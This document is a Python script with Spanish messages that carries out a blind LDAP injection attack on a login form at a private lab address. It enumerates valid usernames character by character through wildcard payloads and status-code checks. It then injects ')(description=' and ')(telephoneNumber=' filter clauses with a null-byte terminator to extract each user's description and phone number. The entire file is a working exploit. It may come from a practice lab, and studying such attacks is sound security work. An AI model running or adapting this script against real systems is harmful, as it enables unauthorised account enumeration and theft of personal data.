#!/usr/bin/python3

import requests
import time
import sys
import signal
import string

from pwn import *

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.10/"

def getInitialUsers():

    characters = string.ascii_lowercase

    initial_users = []

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    for character in characters: 

        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)

        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

        if r.status_code == 301: 
            initial_users.append(character)

    return initial_users

def getUsers(initial_users):

    characters = string.ascii_lowercase + string.digits
    
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    valid_users = []

    for first_character in initial_users: 

        user = ""

        for position in range(0, 15):
            for character in characters: 

                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)

                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

                if r.status_code == 301: 
                    user += character
                    break

        valid_users.append(first_character + user)

    print("\n")

    for user in valid_users: 
        log.info("Usuario válido encontrado: %s" % user)

    print("\n")

    return valid_users

def getDescriptions(user):

    characters = string.ascii_lowercase + ' ' + string.ascii_uppercase + string.digits

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    description = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Descripción")

    for position in range(0, 100):
        for character in characters: 

            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301: 
                description += character
                p2.status(description)
                break

    p1.success("Proceso de fuerza bruta concluido")
    p2.success("La descripción del usuario %s es: %s" % (user, description))

    print("\n")

def getTelephoneNumber(user): 

    characters = string.digits

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    telephoneNumber = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Descripción")

    for position in range(0, 9):
        for character in characters: 
            
            post_data = "user_id={})(telephoneNumber={}{}*))%00&password=*&login=1&submit=Submit".format(user, telephoneNumber, character)

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301: 
                telephoneNumber += character
                p2.status(telephoneNumber)
                break

    p1.success("Proceso de fuerza bruta concluido")
    p2.success("El número de teléfono para el usuario %s es: %s" % (user, telephoneNumber))

    print("\n")

if __name__ == '__main__':

    initial_users = getInitialUsers()

    valid_users = getUsers(initial_users)
  
    for i in range(0, 4):
        getDescriptions(valid_users[i])

    for i in range (1, 4):
        getTelephoneNumber(valid_users[i])
